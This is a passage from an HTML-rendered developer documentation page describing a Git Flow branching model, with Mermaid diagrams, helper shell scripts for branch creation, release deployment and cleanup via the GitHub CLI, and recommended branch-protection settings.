 L2 --&gt;|Git Push| GH_Public

 GH_Private --&gt;|Git Submodule| GH_Public
 GH_Public --&gt; Actions

 Actions --&gt;|Deploy| GH_Pages
 Actions --&gt;|Deploy| Vercel
 Actions --&gt;|Deploy| More&lt;/pre&gt;
&lt;template&gt;flowchart LR
 L[Local Files]
 L2[Local Files]

 GH_Private[(GitHub Private Repo)]
 GH_Public[(GitHub Public Repo)]

 Actions[GitHub Actions]

 GH_Pages[GitHub Pages]
 Vercel[Vercel]
 More[More...]

 L --&gt;|Git Push| GH_Private
 L2 --&gt;|Git Push| GH_Public

 GH_Private --&gt;|Git Submodule| GH_Public
 GH_Public --&gt; Actions

 Actions --&gt;|Deploy| GH_Pages
 Actions --&gt;|Deploy| Vercel
 Actions --&gt;|Deploy| More&lt;/template&gt;&lt;h2 class="heading-element" id="branch"&gt;&lt;span&gt;15 Branch&lt;/span&gt;
 &lt;a href="#branch" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;I follow a Git Flow-inspired model because it enforces discipline in collaborative work.
It allows features, hotfixes, and releases to evolve in parallel, with clear boundaries and responsibilities&lt;/p&gt;
&lt;p&gt;Maintaining a clean and sustainable workflow is key in collaborative and long-term projects. Here’s the branching model I follow:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;main&lt;/code&gt;&lt;/strong&gt; – The &lt;strong&gt;production&lt;/strong&gt; branch. Only stable, reviewed, and tested code lives here.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;develop&lt;/code&gt;&lt;/strong&gt; – The &lt;strong&gt;integration&lt;/strong&gt; branch for ongoing development. Features are merged here after review and testing.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;feature/*&lt;/code&gt;&lt;/strong&gt; – Used for individual feature development (e.g., &lt;code&gt;feature/log-capture&lt;/code&gt;, &lt;code&gt;feature/api-hardening&lt;/code&gt;).&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;bugfix/*&lt;/code&gt;&lt;/strong&gt; – Quick patches or specific bug resolutions.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;release/*&lt;/code&gt;&lt;/strong&gt; – For preparing stable releases, including documentation and final testing.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This structure allows me to stay agile while ensuring quality and traceability in the work I deliver.&lt;/p&gt;
&lt;pre class="mermaid"&gt;gitGraph
 commit id: "Initial commit"
 branch develop
 checkout develop
 commit id: "Init project structure"
 commit id: "Setup CI/CD"
 
 branch feature/log-capture
 checkout feature/log-capture
 commit id: "Add log capture module"
 checkout develop
 merge feature/log-capture id: "Merge log-capture"

 branch feature/api-hardening
 checkout feature/api-hardening
 commit id: "Improve API input validation"
 commit id: "Add rate limiting"
 checkout develop
 merge feature/api-hardening id: "Merge api-hardening"

 branch bugfix/token-expiry
 checkout bugfix/token-expiry
 commit id: "Fix token expiry bug"
 checkout develop
 merge bugfix/token-expiry id: "Merge token fix"

 branch release/v1.0
 checkout release/v1.0
 commit id: "Prepare release v1.0"
 checkout main
 merge release/v1.0 id: "Release v1.0 to production"
 commit id: "Hotfix README"

 checkout develop
 branch feature/ui-redesign
 commit id: "Start UI redesign"&lt;/pre&gt;
&lt;template&gt;gitGraph
 commit id: "Initial commit"
 branch develop
 checkout develop
 commit id: "Init project structure"
 commit id: "Setup CI/CD"
 
 branch feature/log-capture
 checkout feature/log-capture
 commit id: "Add log capture module"
 checkout develop
 merge feature/log-capture id: "Merge log-capture"

 branch feature/api-hardening
 checkout feature/api-hardening
 commit id: "Improve API input validation"
 commit id: "Add rate limiting"
 checkout develop
 merge feature/api-hardening id: "Merge api-hardening"

 branch bugfix/token-expiry
 checkout bugfix/token-expiry
 commit id: "Fix token expiry bug"
 checkout develop
 merge bugfix/token-expiry id: "Merge token fix"

 branch release/v1.0
 checkout release/v1.0
 commit id: "Prepare release v1.0"
 checkout main
 merge release/v1.0 id: "Release v1.0 to production"
 commit id: "Hotfix README"

 checkout develop
 branch feature/ui-redesign
 commit id: "Start UI redesign"&lt;/template&gt;&lt;h2 class="heading-element" id="automation"&gt;&lt;span&gt;16 Automation&lt;/span&gt;
 &lt;a href="#automation" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;This repository follows a customized Git Flow strategy using helper shell scripts to simplify and streamline branch management, releases, and cleanup via the GitHub CLI.&lt;/p&gt;
&lt;div class="alert alert-important"&gt;&lt;p class="alert-title"&gt;&lt;svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"&gt;&lt;path d="M0 1.75C0 .784.784.0 1.75.0h12.5C15.216.0 16 .784 16 1.75v9.5A1.75 1.75.0 0114.25 13H8.06l-2.573 2.573A1.458 1.458.0 013 14.543V13H1.75A1.75 1.75.0 010 11.25zm1.75-.25a.25.25.0 00-.25.25v9.5c0 .138.112.25.25.25h2a.75.75.0 01.75.75v2.19l2.72-2.72a.749.749.0 01.53-.22h6.5a.25.25.0 00.25-.25v-9.5a.25.25.0 00-.25-.25zm7 2.25v2.5a.75.75.0 01-1.5.0v-2.5a.75.75.0 011.5.0zM9 9A1 1 0 117 9a1 1 0 012 0z"/&gt;&lt;/svg&gt;Important&lt;/p&gt;&lt;p&gt;Before running any scripts, make sure you are in the root directory of the project. You’ll also need to have Git installed on your machine, as well as the &lt;a href="https://cli.github.com/"target="_blank" rel="external nofollow noopener noreferrer"&gt;GitHub CLI (&lt;code&gt;gh&lt;/code&gt;)&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt;. Ensure that &lt;code&gt;gh&lt;/code&gt; is authenticated by running &lt;code&gt;gh auth login&lt;/code&gt; if you haven’t already.&lt;/p&gt;&lt;/div&gt;&lt;h3 class="heading-element" id="script-overview"&gt;&lt;span&gt;16.1 Script Overview&lt;/span&gt;
 &lt;a href="#script-overview" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
 &lt;th&gt;Script&lt;/th&gt;
 &lt;th&gt;Purpose&lt;/th&gt;
 &lt;/tr&gt;
 &lt;/thead&gt;
 &lt;tbody&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;code&gt;github-branch.sh&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;Create a branch (&lt;code&gt;feature/&lt;/code&gt;, &lt;code&gt;bugfix/&lt;/code&gt;, &lt;code&gt;hotfix/&lt;/code&gt;, &lt;code&gt;release/&lt;/code&gt;) and optionally open a pull request&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;code&gt;github-deploy&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;Prepare and merge a release branch into &lt;code&gt;main&lt;/code&gt;, then sync with &lt;code&gt;develop&lt;/code&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;code&gt;github-merged.sh&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;Clean up a merged branch locally and remotely&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/tbody&gt;
&lt;/table&gt;
&lt;div class="alert alert-note"&gt;&lt;p class="alert-title"&gt;&lt;svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"&gt;&lt;path d="M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z"/&gt;&lt;/svg&gt;Note&lt;/p&gt;&lt;p&gt;All scripts used to automate and simplify the Git workflow are stored in the &lt;code&gt;.shell/&lt;/code&gt; directory at the root of the project.
This dedicated folder centralizes all shell scripts related to branch management, deployment, and cleanup tasks, making it easier to maintain and update the automation tools.
By keeping these scripts organized in one place, you can quickly locate, modify, or extend the workflow helpers as needed, ensuring a clean and manageable project structure.&lt;/p&gt;&lt;/div&gt;&lt;h3 class="heading-element" id="usage"&gt;&lt;span&gt;16.2 Usage&lt;/span&gt;
 &lt;a href="#usage" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;h4 class="heading-element" id="create-a-branch-feature-bugfix-etc"&gt;&lt;span&gt;16.2.1 Create a Branch (Feature, Bugfix, etc.)&lt;/span&gt;
 &lt;a href="#create-a-branch-feature-bugfix-etc" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h4&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;./.shell/github-branch.sh&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;You will be prompted to:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Choose the branch type:
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;feature/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;bugfix/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;hotfix/&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;release/&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Enter a descriptive name (e.g., &lt;code&gt;fix-login-error&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;Decide whether to push and create a Pull Request (PR) right away&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The script will:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Checkout the correct base branch (&lt;code&gt;main&lt;/code&gt; or &lt;code&gt;develop&lt;/code&gt;)&lt;/li&gt;
&lt;li&gt;Create and switch to the new branch&lt;/li&gt;
&lt;li&gt;Optionally push and open a PR via GitHub CLI&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 class="heading-element" id="deploy-a-release"&gt;&lt;span&gt;16.2.2 Deploy a Release&lt;/span&gt;
 &lt;a href="#deploy-a-release" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h4&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;./.scripts/github-deploy&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;This script helps with the release process:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Create a &lt;code&gt;release/x.y.z&lt;/code&gt; branch from &lt;code&gt;develop&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Wait for you to finalize and commit all changes&lt;/li&gt;
&lt;li&gt;Push and open a PR into &lt;code&gt;main&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;After confirming merge, it:
&lt;ul&gt;
&lt;li&gt;Updates &lt;code&gt;main&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Merges &lt;code&gt;main&lt;/code&gt; back into &lt;code&gt;develop&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Pushes changes&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 class="heading-element" id="clean-up-merged-branches"&gt;&lt;span&gt;16.2.3 Clean Up Merged Branches&lt;/span&gt;
 &lt;a href="#clean-up-merged-branches" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h4&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;./.scripts/github-merged.sh&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Once your Pull Request has been merged on GitHub:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Run this script &lt;strong&gt;from the feature/hotfix/release branch&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;It will:
&lt;ul&gt;
&lt;li&gt;Confirm you’re on a non-protected branch&lt;/li&gt;
&lt;li&gt;Switch to &lt;code&gt;main&lt;/code&gt; or &lt;code&gt;develop&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Delete the merged branch locally and remotely&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="alert alert-note"&gt;&lt;p class="alert-title"&gt;&lt;svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"&gt;&lt;path d="M0 8a8 8 0 1116 0A8 8 0 010 8zm8-6.5a6.5 6.5.0 100 13 6.5 6.5.0 000-13zM6.5 7.75A.75.75.0 017.25 7h1a.75.75.0 01.75.75v2.75h.25a.75.75.0 010 1.5h-2a.75.75.0 010-1.5h.25v-2h-.25a.75.75.0 01-.75-.75zM8 6a1 1 0 110-2 1 1 0 010 2z"/&gt;&lt;/svg&gt;Note&lt;/p&gt;&lt;p&gt;Protected branches such as &lt;code&gt;main&lt;/code&gt; and &lt;code&gt;develop&lt;/code&gt; are safeguarded by repository settings to prevent accidental deletion or force-pushes. For this reason, the cleanup script will &lt;strong&gt;not&lt;/strong&gt; allow you to delete these branches locally or remotely. This ensures the stability and integrity of your main development and production branches throughout your workflow.&lt;/p&gt;&lt;/div&gt;&lt;h3 class="heading-element" id="branch-protection-recommended-github-settings"&gt;&lt;span&gt;16.3 Branch Protection (Recommended GitHub Settings)&lt;/span&gt;
 &lt;a href="#branch-protection-recommended-github-settings" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;p&gt;Enable protection rules on:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;main&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;develop&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;With:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Require pull request reviews before merging&lt;/li&gt;
&lt;li&gt;Require status checks (if you have CI)&lt;/li&gt;
&lt;li&gt;Prevent force pushes&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 class="heading-element" id="example-workflow"&gt;&lt;span&gt;16.4 Example Workflow&lt;/span&gt;
 &lt;a href="#example-workflow" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Start a new feature&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;./.shell/github-branch.sh
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Work, commit, push, and open PR&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# After merge:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;./.shell/github-merged.sh
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# For release:&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;./.shell/github-deploy&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;div class="alert alert-tip"&gt;&lt;p class="alert-title"&gt;&lt;svg class="icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16"&gt;&lt;path d="M8 1.5c-2.363.0-4 1.69-4 3.75.0.984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75.0 01-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456.0 00-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863.0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751.0 01-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304.0-2.06-1.637-3.75-4-3.75zM5.75 12h4.5a.75.75.0 010 1.5h-4.5a.75.75.0 010-1.5zM6 15.25a.75.75.0 01.75-.75h2.5a.75.75.0 010 1.5h-2.5A.75.75.0 016 15.25z"/&gt;&lt;/svg&gt;Tip&lt;/p&gt;&lt;p&gt;For easier and quicker access to the Git Flow helper scripts, you can create shell aliases by adding the following lines to your shell configuration file (e.g., &lt;code&gt;.bashrc&lt;/code&gt; or &lt;code&gt;.zshrc&lt;/code&gt;):&lt;/p&gt;&lt;/div&gt;&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;alias&lt;/span&gt; gitflow-branch&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;./.shell/github-branch.sh&amp;#34;&lt;/span&gt;
